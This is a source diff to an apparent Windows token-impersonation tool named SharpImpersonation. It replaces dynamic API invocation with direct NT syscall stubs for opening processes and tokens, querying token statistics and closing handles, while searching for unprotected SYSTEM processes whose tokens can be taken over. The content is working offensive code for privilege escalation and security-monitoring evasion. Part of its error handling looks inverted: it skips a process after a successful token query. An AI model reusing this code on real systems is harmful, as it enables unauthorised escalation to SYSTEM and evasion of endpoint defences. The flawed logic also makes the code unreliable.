@@ -172,26 +172,62 @@ namespace SharpImpersonation
             Dictionary<String, UInt32> users = new Dictionary<String, UInt32>();
             foreach (Process p in Process.GetProcesses())
             {
-                object[] OpenProcessArgs = { Constants.PROCESS_QUERY_LIMITED_INFORMATION, true, (UInt32)p.Id };
-                IntPtr hProcess = (IntPtr)InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "OpenProcess", typeof(OpenProcess), ref OpenProcessArgs, true, true);
+
+                // NtOpenProcess
+                IntPtr stub = InvokeItDynamically.DynGen.GetSyscallStub("NtOpenProcess");
+                NtOpenProcess OpenProc = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess));
+
+                IntPtr hProcess = IntPtr.Zero;
+                OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
+
+                CLIENT_ID ci = new CLIENT_ID
+                {
+                    UniqueProcess = (IntPtr)((UInt32)p.Id)
+                };
+
+                InvokeItDynamically.Native.NTSTATUS statusresult;
+
+                statusresult = OpenProc(
+                    ref hProcess,
+                    Constants.PROCESS_QUERY_LIMITED_INFORMATION,
+                    ref oa,
+                    ref ci);
+
+                if (statusresult == 0)
+                {
+                    Debug.WriteLine("\r\n[+] NtOpenProcess Success!");
+                }
+                else
+                {
+                    Debug.WriteLine("[-] NtOpenProcess failed - error code: " + statusresult);
+                }
 
                 if (IntPtr.Zero == hProcess)
                 {
-                    Debug.WriteLine("[-] Open Process failed");
+                    Debug.WriteLine("[-] Proc Handle not valid");
                     continue;
                 }
+
                 IntPtr hToken = IntPtr.Zero;
 
-                object[] OpenProcessTokenArgs = { hProcess, (UInt32)ACCESS_MASK.MAXIMUM_ALLOWED, hToken };
+                // NtOpenProcessToken
+                stub = InvokeItDynamically.DynGen.GetSyscallStub("NtOpenProcessToken");
+                NtOpenProcessToken NtOpenProcTok = (NtOpenProcessToken)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcessToken));
 
-                bool success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "OpenProcessToken", typeof(OpenProcessToken), ref OpenProcessTokenArgs, true, true);
-                hToken = (IntPtr)OpenProcessTokenArgs[2];
+                statusresult = NtOpenProcTok(
+                    hProcess,
+                    (UInt32)ACCESS_MASK.MAXIMUM_ALLOWED,
+                    out hToken);
 
-                if (!(success))
+                if (statusresult == 0)
                 {
-                    Console.WriteLine("[-] OpenProcessToken failed");
-                    continue;
-                }                
+                    Debug.WriteLine("\r\n[+] NtOpenProcessToken Success!");
+                }
+                else
+                {
+                    Debug.WriteLine("[-] NtOpenProcessToken failed - error code: " + statusresult);
+                }
+               
 
                 if (findElevation)
                 {
@@ -201,7 +237,6 @@ namespace SharpImpersonation
                     }
                 }
 
-                UInt32 dwLength = 0;
                 _TOKEN_STATISTICS tokenStatistics = new _TOKEN_STATISTICS();
                 //Split up impersonation and primary tokens
                 if (_TOKEN_TYPE.TokenImpersonation == tokenStatistics.TokenType)
@@ -209,36 +244,54 @@ namespace SharpImpersonation
                     continue;
                 }
 
-                uint newLength = 0;
-                object[] GetTokenInformationArgs =
+                // NtQueryInformationToken
+                stub = InvokeItDynamically.DynGen.GetSyscallStub("NtQueryInformationToken");
+                NtQueryInformationToken NtQueryInformationTok = (NtQueryInformationToken)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtQueryInformationToken));
+                int ReturnLength;
+                var uintresult = NtQueryInformationTok(hToken, 10 /*TokenStatistics*/, IntPtr.Zero, 0, out ReturnLength);
+
+                if (uintresult >= 0)
                 {
-                    hToken, _TOKEN_INFORMATION_CLASS.TokenStatistics, tokenStatistics, dwLength, newLength
-                };
-                bool result = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "GetTokenInformation", typeof(GetTokenInformation2), ref GetTokenInformationArgs, true, true);
-                dwLength = (UInt32)GetTokenInformationArgs[4];
-                tokenStatistics = (_TOKEN_STATISTICS)GetTokenInformationArgs[2];
-                
-                if (!result)
+                    Debug.WriteLine("\r\n[+] NtQueryInformationToken Success!");
+                }
+                else
                 {
-                    object[] GetTokenInformationArgs2 =
+                    Debug.WriteLine("[-] NtQueryInformationToken failed - error code: " + uintresult);
+                }
+
+                IntPtr buffer = Marshal.AllocHGlobal((int)ReturnLength);
+
+                if (uintresult >= 0)
+                {
+                    uintresult = NtQueryInformationTok(hToken, 10 /*TokenStatistics*/, buffer, ReturnLength, out ReturnLength);
+                    if (uintresult >= 0)
                     {
-                        hToken, _TOKEN_INFORMATION_CLASS.TokenStatistics, tokenStatistics, dwLength, newLength
-                    };
-                    dwLength = (UInt32)GetTokenInformationArgs2[4];
-                    tokenStatistics = (_TOKEN_STATISTICS)GetTokenInformationArgs2[2];
-                    result = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "GetTokenInformation", typeof(GetTokenInformation2), ref GetTokenInformationArgs2, true, true);
-                    dwLength = (UInt32)GetTokenInformationArgs2[4];
-                    tokenStatistics = (_TOKEN_STATISTICS)GetTokenInformationArgs2[2];
-                    if (!result)
+                        tokenStatistics = (_TOKEN_STATISTICS)Marshal.PtrToStructure(buffer, typeof(_TOKEN_STATISTICS));
+                    }
+                    Marshal.FreeHGlobal(buffer);
+
+                    if (uintresult == 0)
                     {
                         Console.WriteLine("GetTokenInformation: {0}", Marshal.GetLastWin32Error());
                         continue;
                     }
                 }
 
-                object[] CloseHandleTokenArgs = { hToken };
-                InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref CloseHandleTokenArgs, true, true);
+                // NtClose
+                stub = InvokeItDynamically.DynGen.GetSyscallStub("NtClose");
+                NtClose NtClose = (NtClose)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtClose));
 
+                statusresult = NtClose(hToken);
+
+                if (statusresult == 0)
+                {
+                    Debug.WriteLine("\r\n[+] NtClose Success!");
+                }
+                else
+                {
+                    Debug.WriteLine("[-] NtClose failed - error code: " + statusresult);
+                }
+               
 
                 String userName = String.Empty;
                 if (!ConvertTokenStatisticsToUsername(tokenStatistics, ref userName))
@@ -250,11 +303,11 @@ namespace SharpImpersonation
                 {
                     ////////////////////////////////////////////////////////////////////////////////
                     // Finds a process with the SYSTEM token that is NOT protected (0xFFFFFFFE)
-                    // https://bit.ly/37ITNWi
-                    // (bitly link for Process Protection entry at docs.microsoft.com)
+                    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_protection_level_information
                     ////////////////////////////////////////////////////////////////////////////////
 
-                    if (userName == "NT AUTHORITY\\SYSTEM")
+                    // Beware of the Germans :-P
+                    if (userName == "NT AUTHORITY\\SYSTEM" || userName == "NT-AUTORITÄT\\SYSTEM")
                     {
                         /* Allocate memory for a new PS_PROTECTION */
                         _PROCESS_PROTECTION_LEVEL_INFORMATION psProtection = new _PROCESS_PROTECTION_LEVEL_INFORMATION();
@@ -267,7 +320,7 @@ namespace SharpImpersonation
                         };
 
                         /* Call GetProcessInformation and output Process Protection Level Info */
-                        result = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "GetProcessInformation", typeof(GetProcessInformation), ref ProtectionInformationArgs, true, true);
+                        var result = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "GetProcessInformation", typeof(GetProcessInformation), ref ProtectionInformationArgs, true, true);
 
                         if (!result)
                         {
@@ -294,8 +347,17 @@ namespace SharpImpersonation
                     }
                 }
 
-                object[] CloseHandleArgs = { hProcess };
-                InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref CloseHandleArgs, true, true);
+                // NtClose
+                statusresult = NtClose(hProcess);
+
+                if (statusresult == 0)
+                {
+                    Debug.WriteLine("\r\n[+] NtClose Success!");
+                }
+                else
+                {
+                    Debug.WriteLine("[-] NtClose failed - error code: " + statusresult);
+                }
             }
             return users;
         }
@@ -348,27 +410,75 @@ namespace SharpImpersonation
             Console.WriteLine("[*] Examining {0} processes", pids.Length);
             foreach (Process p in pids)
             {
-                object[] OpenProcessArgs = { Constants.PROCESS_QUERY_LIMITED_INFORMATION, true, (UInt32)p.Id };
-                IntPtr hProcess = (IntPtr)InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "OpenProcess", typeof(OpenProcess), ref OpenProcessArgs, true, true);
+                // NtOpenProcess
+                IntPtr stub = InvokeItDynamically.DynGen.GetSyscallStub("NtOpenProcess");
+                NtOpenProcess OpenProc = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess));
+
+                IntPtr hProcess = IntPtr.Zero;
+                OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
+
+                CLIENT_ID ci = new CLIENT_ID
+                {
+                    UniqueProcess = (IntPtr)((UInt32)p.Id)
+                };
+
+                InvokeItDynamically.Native.NTSTATUS statusresult;
+
+                statusresult = OpenProc(
+                    ref hProcess,
+                    Constants.PROCESS_QUERY_LIMITED_INFORMATION,
+                    ref oa,
+                    ref ci);
+
+                if (statusresult == 0)
+                {
+                    Debug.WriteLine("\r\n[+] NtOpenProcess Success!");
+                }
+                else
+                {
+                    Debug.WriteLine("[-] NtOpenProcess failed - error code: " + statusresult);
+                }
+
                 if (IntPtr.Zero == hProcess)
                 {
+                    Debug.WriteLine("[-] Proc Handle not valid");
                     continue;
                 }
+
                 IntPtr hToken = IntPtr.Zero;
 
-                object[] OpenProcessTokenArgs = { hProcess, (UInt32)ACCESS_MASK.MAXIMUM_ALLOWED, hToken };
+                // NtOpenProcessToken
+                stub = InvokeItDynamically.DynGen.GetSyscallStub("NtOpenProcessToken");
+                NtOpenProcessToken NtOpenProcTok = (NtOpenProcessToken)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcessToken));
 
-                bool success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "OpenProcessToken", typeof(OpenProcessToken), ref OpenProcessTokenArgs, true, true);
-                hToken = (IntPtr)OpenProcessTokenArgs[2];
+                statusresult = NtOpenProcTok(
+                    hProcess,
+                    (UInt32)ACCESS_MASK.MAXIMUM_ALLOWED,
+                    out hToken);
 
-                if (!(success))
+                if (statusresult == 0)
                 {
-                    continue;
+                    Debug.WriteLine("\r\n[+] NtOpenProcessToken Success!");
+                }
+                else
+                {
+                    Debug.WriteLine("[-] NtOpenProcessToken failed - error code: " + statusresult);
                 }
 
+                // NtClose
+                stub = InvokeItDynamically.DynGen.GetSyscallStub("NtClose");
+                NtClose NtClose = (NtClose)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtClose));
 
-                object[] CloseHandleArgs = { hProcess };
-                InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref CloseHandleArgs, true, true);
+                statusresult = NtClose(hProcess);
+
+                if (statusresult == 0)
+                {
+                    Debug.WriteLine("\r\n[+] NtClose Success!");
+                }
+                else
+                {
+                    Debug.WriteLine("[-] NtClose failed - error code: " + statusresult);
+                }
 
                 if (findElevation && !CheckPrivileges.CheckElevation(hToken))
                 {
@@ -376,38 +486,56 @@ namespace SharpImpersonation
                 }
 
 
-                UInt32 dwLength = 0;
                 _TOKEN_STATISTICS tokenStatistics = new _TOKEN_STATISTICS();
+                //Split up impersonation and primary tokens
+                if (_TOKEN_TYPE.TokenImpersonation == tokenStatistics.TokenType)
+                {
+                    continue;
+                }
 
-                uint newLength = 0;
-                object[] GetTokenInformationArgs =
+                // NtQueryInformationToken
+                stub = InvokeItDynamically.DynGen.GetSyscallStub("NtQueryInformationToken");
+                NtQueryInformationToken NtQueryInformationTok = (NtQueryInformationToken)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtQueryInformationToken));
+                int ReturnLength;
+                var uintresult = NtQueryInformationTok(hToken, 10 /*TokenStatistics*/, IntPtr.Zero, 0, out ReturnLength);
+
+                if (uintresult >= 0)
                 {
-                    hToken, _TOKEN_INFORMATION_CLASS.TokenStatistics, tokenStatistics, dwLength, newLength
-                };
-                bool result = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "GetTokenInformation", typeof(GetTokenInformation2), ref GetTokenInformationArgs, true, true);
-                dwLength = (UInt32)GetTokenInformationArgs[4];
-                tokenStatistics = (_TOKEN_STATISTICS)GetTokenInformationArgs[2];
-                //Console.WriteLine(result);
-                if (!result)
+                    Debug.WriteLine("\r\n[+] NtQueryInformationToken Success!");
+                }
+                else
                 {
-                    object[] GetTokenInformationArgs2 =
+                    Debug.WriteLine("[-] NtQueryInformationToken failed - error code: " + uintresult);
+                }
+
+                IntPtr buffer = Marshal.AllocHGlobal((int)ReturnLength);
+
+                if (uintresult >= 0)
+                {
+                    uintresult = NtQueryInformationTok(hToken, 10 /*TokenStatistics*/, buffer, ReturnLength, out ReturnLength);
+                    if (uintresult >= 0)
                     {
-                        hToken, _TOKEN_INFORMATION_CLASS.TokenStatistics, tokenStatistics, dwLength, newLength
-                    };
-                    dwLength = (UInt32)GetTokenInformationArgs2[4];
-                    tokenStatistics = (_TOKEN_STATISTICS)GetTokenInformationArgs2[2];
-                    result = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "GetTokenInformation", typeof(GetTokenInformation2), ref GetTokenInformationArgs2, true, true);
-                    dwLength = (UInt32)GetTokenInformationArgs2[4];
-                    tokenStatistics = (_TOKEN_STATISTICS)GetTokenInformationArgs2[2];
-                    if (!result)
+                        tokenStatistics = (_TOKEN_STATISTICS)Marshal.PtrToStructure(buffer, typeof(_TOKEN_STATISTICS));
+                    }
+                    Marshal.FreeHGlobal(buffer);
+
+                    if (uintresult == 0)
                     {
                         Console.WriteLine("GetTokenInformation: {0}", Marshal.GetLastWin32Error());
                         continue;
                     }
                 }
 
-                object[] CloseHandleTokenArgs = { hToken };
-                InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref CloseHandleTokenArgs, true, true);
+                statusresult = NtClose(hToken);
+
+                if (statusresult == 0)
+                {
+                    Debug.WriteLine("\r\n[+] NtClose Success!");
+                }
+                else
+                {
+                    Debug.WriteLine("[-] NtClose failed - error code: " + statusresult);
+                }
 
 
                 if (_TOKEN_TYPE.TokenImpersonation == tokenStatistics.TokenType)
